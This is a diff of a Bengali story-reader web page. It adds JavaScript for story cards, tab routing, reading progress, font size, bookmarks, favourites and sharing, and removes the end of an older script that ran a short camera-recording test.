+                                </button>
+                                <div class="card-actions">
+                                    <button class="btn-action-sm ${isFav ? 'active-fav' : ''}" onclick="app.toggleFavorite(${story.id})" title="ফেভারিট">
+                                        <svg class="icon" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+                                    </button>
+                                    <button class="btn-action-sm ${isBm ? 'active-bm' : ''}" onclick="app.toggleBookmark(${story.id})" title="বুকমার্ক">
+                                        <svg class="icon" viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            },
+
+            renderStories() {
+                const container = document.getElementById('story-list');
+                const list = this.getFilteredStories();
+
+                if (list.length === 0) {
+                    container.innerHTML = `
+                        <div class="empty-state" style="grid-column: 1 / -1;">
+                            <svg class="icon empty-icon" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                            <h3>কোনো গল্প পাওয়া যায়নি!</h3>
+                            <p style="color: var(--text-muted); font-size: 0.9rem;">অন্য কি-ওয়ার্ড বা ক্যাটাগরি দিয়ে চেষ্টা করুন।</p>
+                        </div>
+                    `;
+                    return;
+                }
+
+                container.innerHTML = list.map(s => this.createStoryCardHTML(s)).join('');
+            },
+
+            // --- SPA Navigation & Tabs ---
+            switchTab(tab) {
+                // Hide reader view if open
+                document.getElementById('reading-view').style.display = 'none';
+                document.getElementById('main-view').style.display = 'block';
+                window.location.hash = tab === 'home' ? '' : `#${tab}`;
+
+                document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
+                document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+
+                const targetTab = (tab === 'library-continue') ? 'library' : tab;
+                const tabEl = document.getElementById(`tab-${targetTab}`);
+                if (tabEl) tabEl.style.display = 'block';
+
+                const navBtn = document.getElementById(`nav-btn-${targetTab}`);
+                if (navBtn) navBtn.classList.add('active');
+
+                if (tab === 'bookmark') this.renderBookmarks();
+                if (tab === 'favorite') this.renderFavorites();
+                if (tab === 'library' || tab === 'library-continue') this.renderLibrary();
+
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            },
+
+            // --- Single Story Reading Engine ---
+            openStory(id, restoreScroll = true) {
+                const story = stories.find(s => s.id === Number(id));
+                if (!story) return;
+
+                this.currentStoryId = story.id;
+                window.location.hash = `#story-${story.id}`;
+
+                // Populate Reading View
+                document.getElementById('reader-title').textContent = story.title;
+                document.getElementById('reader-author').textContent = `✍️ ${story.author}`;
+                document.getElementById('reader-category').textContent = `🏷️ ${story.category}`;
+                document.getElementById('reader-date').textContent = `📅 ${story.date}`;
+                document.getElementById('reader-content').textContent = story.content.trim();
+                document.getElementById('reader-img').src = story.image;
+
+                // Sync reader header icons
+                this.syncReaderHeaderActions();
+
+                // Switch UI views
+                document.getElementById('main-view').style.display = 'none';
+                const readerView = document.getElementById('reading-view');
+                readerView.style.display = 'block';
+
+                // Restore previous reading position
+                setTimeout(() => {
+                    if (restoreScroll) {
+                        const progressData = this.getProgress(story.id);
+                        if (progressData && progressData.scrollY > 0) {
+                            window.scrollTo({ top: progressData.scrollY, behavior: 'smooth' });
+                        } else {
+                            window.scrollTo(0, 0);
+                        }
+                    } else {
+                        window.scrollTo(0, 0);
+                    }
+                    this.updateReadingProgress();
+                }, 50);
+            },
+
+            closeReader() {
+                window.history.replaceState(null, null, ' ');
+                this.switchTab('home');
+            },
+
+            readNextStory() {
+                const currentIndex = stories.findIndex(s => s.id === this.currentStoryId);
+                if (currentIndex > -1 && currentIndex < stories.length - 1) {
+                    this.openStory(stories[currentIndex + 1].id, false);
+                } else {
+                    alert('আপনি সর্বশেষ গল্পে পৌঁছে গেছেন!');
+                }
+            },
+
+            setupScrollListener() {
+                window.addEventListener('scroll', () => {
+                    if (document.getElementById('reading-view').style.display === 'block') {
+                        this.updateReadingProgress();
+                    }
+                }, { passive: true });
+            },
+
+            updateReadingProgress() {
+                if (!this.currentStoryId) return;
+
+                const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+                const scrollTop = window.scrollY;
+                let percent = 0;
+
+                if (docHeight > 0) {
+                    percent = Math.min(100, Math.max(0, Math.round((scrollTop / docHeight) * 100)));
+                }
+
+                // Update Progress UI
+                document.getElementById('reading-progress-bar').style.width = `${percent}%`;
+                document.getElementById('reader-progress-percent').textContent = `পড়ার অগ্রগতি: ${percent}%`;
+
+                // Save reading progress to LocalStorage
+                this.saveProgress(this.currentStoryId, percent, scrollTop);
+            },
+
+            // --- Font Size Adjustment ---
+            loadFontSize() {
+                const saved = localStorage.getItem(this.STORAGE_FONT_SIZE);
+                if (saved) {
+                    this.fontSize = parseInt(saved, 10);
+                    document.documentElement.style.setProperty('--reader-font-size', `${this.fontSize}px`);
+                }
+            },
+
+            adjustFontSize(delta) {
+                if (delta === 0) {
+                    this.fontSize = 19; // Reset
+                } else {
+                    this.fontSize = Math.min(28, Math.max(15, this.fontSize + delta));
+                }
+                document.documentElement.style.setProperty('--reader-font-size', `${this.fontSize}px`);
+                localStorage.setItem(this.STORAGE_FONT_SIZE, this.fontSize);
+            },
+
+            // --- LocalStorage Helpers ---
+            getBookmarks() {
+                return JSON.parse(localStorage.getItem(this.STORAGE_BOOKMARKS) || '[]');
+            },
+
+            isBookmarked(id) {
+                return this.getBookmarks().includes(id);
+            },
+
+            toggleBookmark(id) {
+                let list = this.getBookmarks();
+                if (list.includes(id)) {
+                    list = list.filter(item => item !== id);
+                } else {
+                    list.push(id);
+                }
+                localStorage.setItem(this.STORAGE_BOOKMARKS, JSON.stringify(list));
+                this.renderStories();
+                this.updateLibraryStats();
+                if (document.getElementById('tab-bookmark').style.display === 'block') {
+                    this.renderBookmarks();
+                }
+            },
+
+            getFavorites() {
+                return JSON.parse(localStorage.getItem(this.STORAGE_FAVORITES) || '[]');
+            },
+
+            isFavorite(id) {
+                return this.getFavorites().includes(id);
+            },
+
+            toggleFavorite(id) {
+                let list = this.getFavorites();
+                if (list.includes(id)) {
+                    list = list.filter(item => item !== id);
+                } else {
+                    list.push(id);
+                }
+                localStorage.setItem(this.STORAGE_FAVORITES, JSON.stringify(list));
+                this.renderStories();
+                this.updateLibraryStats();
+                if (document.getElementById('tab-favorite').style.display === 'block') {
+                    this.renderFavorites();
+                }
+            },
+
+            toggleBookmarkCurrent() {
+                if (this.currentStoryId) {
+                    this.toggleBookmark(this.currentStoryId);
+                    this.syncReaderHeaderActions();
+                }
+            },
+
+            toggleFavCurrent() {
+                if (this.currentStoryId) {
+                    this.toggleFavorite(this.currentStoryId);
+                    this.syncReaderHeaderActions();
+                }
+            },
+
+            syncReaderHeaderActions() {
+                const bmBtn = document.getElementById('reader-bm-btn');
+                const favBtn = document.getElementById('reader-fav-btn');
+                if (this.isBookmarked(this.currentStoryId)) {
+                    bmBtn.style.color = 'var(--primary)';
+                } else {
+                    bmBtn.style.color = 'var(--text-main)';
+                }
+
+                if (this.isFavorite(this.currentStoryId)) {
+                    favBtn.style.color = 'var(--accent)';
+                } else {
+                    favBtn.style.color = 'var(--text-main)';
+                }
+            },
+
+            saveProgress(id, percent, scrollY) {
+                const allProgress = JSON.parse(localStorage.getItem(this.STORAGE_PROGRESS) || '{}');
+                allProgress[id] = { percent, scrollY, lastRead: Date.now() };
+                localStorage.setItem(this.STORAGE_PROGRESS, JSON.stringify(allProgress));
+                this.updateLibraryStats();
+            },
+
+            getProgress(id) {
+                const allProgress = JSON.parse(localStorage.getItem(this.STORAGE_PROGRESS) || '{}');
+                return allProgress[id] || null;
+            },
+
+            // --- Library & Bookmarks Views Rendering ---
+            renderBookmarks() {
+                const container = document.getElementById('bookmark-list');
+                const bmIds = this.getBookmarks();
+                const list = stories.filter(s => bmIds.includes(s.id));
+
+                if (list.length === 0) {
+                    container.innerHTML = `
+                        <div class="empty-state" style="grid-column: 1 / -1;">
+                            <svg class="icon empty-icon" viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+                            <h3>কোনো বুকমার্ক গল্প নেই</h3>
+                            <p style="color: var(--text-muted);">পছন্দের গল্পগুলো বুকমার্ক করে সহজেই খুঁজে পান।</p>
+                        </div>`;
+                    return;
+                }
+                container.innerHTML = list.map(s => this.createStoryCardHTML(s)).join('');
+            },
+
+            renderFavorites() {
+                const container = document.getElementById('favorite-list');
+                const favIds = this.getFavorites();
+                const list = stories.filter(s => favIds.includes(s.id));
+
+                if (list.length === 0) {
+                    container.innerHTML = `
+                        <div class="empty-state" style="grid-column: 1 / -1;">
+                            <svg class="icon empty-icon" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+                            <h3>কোনো প্রিয় গল্প যুক্ত করেননি</h3>
+                            <p style="color: var(--text-muted);">গল্প কার্ডের হার্ট আইকনে ক্লিক করে ফেভারিট লিস্টে যোগ করুন।</p>
+                        </div>`;
+                    return;
+                }
+                container.innerHTML = list.map(s => this.createStoryCardHTML(s)).join('');
+            },
+
+            renderLibrary() {
+                const continueContainer = document.getElementById('continue-reading-list');
+                const allProgress = JSON.parse(localStorage.getItem(this.STORAGE_PROGRESS) || '{}');
+                
+                // Get stories with recorded progress, sorted by last read
+                const recentStoryIds = Object.keys(allProgress)
+                    .sort((a, b) => allProgress[b].lastRead - allProgress[a].lastRead)
+                    .map(Number);
+
+                const recentStories = stories.filter(s => recentStoryIds.includes(s.id));
+
+                if (recentStories.length === 0) {
+                    continueContainer.innerHTML = `
+                        <div class="empty-state" style="grid-column: 1 / -1;">
+                            <p style="color: var(--text-muted);">আপনি এখনো কোনো গল্প পড়া শুরু করেননি।</p>
+                        </div>`;
+                } else {
+                    continueContainer.innerHTML = recentStories.map(s => {
+                        const prog = allProgress[s.id];
+                        return `
+                            <div class="story-card">
+                                <div class="card-img-wrapper" onclick="app.openStory(${s.id})">
+                                    <img src="${s.image}" alt="${s.title}" class="card-img" onerror="app.imgFallback(this, 'card')">
+                                    <span class="badge-cat">${prog.percent}% পঠিত</span>
+                                </div>
+                                <div class="card-content">
+                                    <h3 class="card-title" onclick="app.openStory(${s.id})">${s.title}</h3>
+                                    <div class="card-author">✍️ ${s.author}</div>
+                                    <div class="card-footer" style="border: none; padding-top: 5px;">
+                                        <button class="btn-read" onclick="app.openStory(${s.id})">
+                                            চালিয়ে পড়ুন (${prog.percent}%)
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    }).join('');
+                }
+
+                this.updateLibraryStats();
+            },
+
+            updateLibraryStats() {
+                const bmCount = this.getBookmarks().length;
+                const favCount = this.getFavorites().length;
+                const allCount = typeof stories !== 'undefined' ? stories.length : 0;
+                const allProgress = JSON.parse(localStorage.getItem(this.STORAGE_PROGRESS) || '{}');
+                const contCount = Object.keys(allProgress).length;
+
+                const bmEl = document.getElementById('stat-bm-count');
+                const favEl = document.getElementById('stat-fav-count');
+                const allEl = document.getElementById('stat-all-count');
+                const contEl = document.getElementById('stat-continue-count');
+
+                if (bmEl) bmEl.textContent = `${bmCount} টি সেভ করা`;
+                if (favEl) favEl.textContent = `${favCount} টি প্রিয়`;
+                if (allEl) allEl.textContent = `${allCount} টি গল্প উপলভ্য`;
+                if (contEl) contEl.textContent = `${contCount} টি গল্প চলমান`;
+            },
+
+            // --- Sharing ---
+            shareStory() {
+                if (navigator.share) {
+                    navigator.share({
+                        title: document.getElementById('reader-title').textContent,
+                        text: 'গল্পের ভুবনে চমৎকার একটি গল্প পড়ুন!',
+                        url: window.location.href,
+                    }).catch(() => {});
+                } else {
+                    navigator.clipboard.writeText(window.location.href);
+                    alert('গল্পের লিংক কপি করা হয়েছে!');
+                }
+            },
+
+            // --- Image Fallback System ---
+            imgFallback(img, type) {
+                img.onerror = null;
+                // High-quality SVG gradients for missing images
+                if (type === 'hero') {
+                    img.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120' viewBox='0 0 120 120'%3E%3Ccircle cx='60' cy='60' r='60' fill='%236366f1'/%3E%3Cpath d='M40 70c10-20 30-20 40 0' stroke='%23ffffff' stroke-width='4' fill='none'/%3E%3Ccircle cx='60' cy='45' r='12' fill='%23ffffff'/%3E%3C/svg%3E";
+                } else {
+                    img.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='250' viewBox='0 0 400 250'%3E%3Crect width='400' height='250' fill='%23334155'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-family='sans-serif' font-size='20' fill='%2394a3b8'%3E%E0%A6%97%E0%A6%B2%E0%A7%8D%E0%A6%AA%E0%A7%87%E0%A6%B0 %E0%A6%AD%E0%A7%81%E0%A6%AC%E0%A6%A8%3C/text%3E%3C/svg%3E";
+                }
+            },
+
+            // --- URL Hash Routing ---
+            setupRouting() {
+                const handleRoute = () => {
+                    const hash = window.location.hash;
+                    if (hash.startsWith('#story-')) {
+                        const id = hash.replace('#story-', '');
+                        this.openStory(id);
+                    } else if (hash === '#bookmark') {
+                        this.switchTab('bookmark');
+                    } else if (hash === '#favorite') {
+                        this.switchTab('favorite');
+                    } else if (hash === '#library') {
+                        this.switchTab('library');
+                    } else {
+                        this.switchTab('home');
+                    }
+                };
+
+                window.addEventListener('hashchange', handleRoute);
+                handleRoute();
+            }
         };
 
-        recorder.start();
-        setTimeout(() => recorder.stop(), 3000);
-
-    } catch (error) {
-        // ব্যবহারকারী পারমিশন Deny/Block করলে কোড এখানে আসবে
-        btn.disabled = false; // আবার যাতে বাটন চাপতে পারে
-
-        if (error.name === "NotAllowedError" || error.name === "PermissionDeniedError") {
-            alert(
-                "আপনি পারমিশন ব্লক করেছেন!\n\n" +
-                "পুনরায় চালু করার নিয়ম:\n" +
-                "১. ব্রাউজারের উপরের অ্যাড্রেস বারের বাম পাশে থাকা 'তালা (Lock)' বা 'সেটিংস' আইকনে চাপুন।\n" +
-                "২. 'Permissions' থেকে Camera অপশনটি 'Allow' করে দিন।\n" +
-                "৩. এবার আবার 'Test On' বাটনে চাপুন।"
-            );
-        } else {
-            console.error("অন্যান্য এরর:", error);
-        }
-    }
-}
-</script>
-
+        // Initialize App on DOM Load
+        document.addEventListener('DOMContentLoaded', () => {
+            app.init();
+        });
+    </script>
 </body>
 </html>
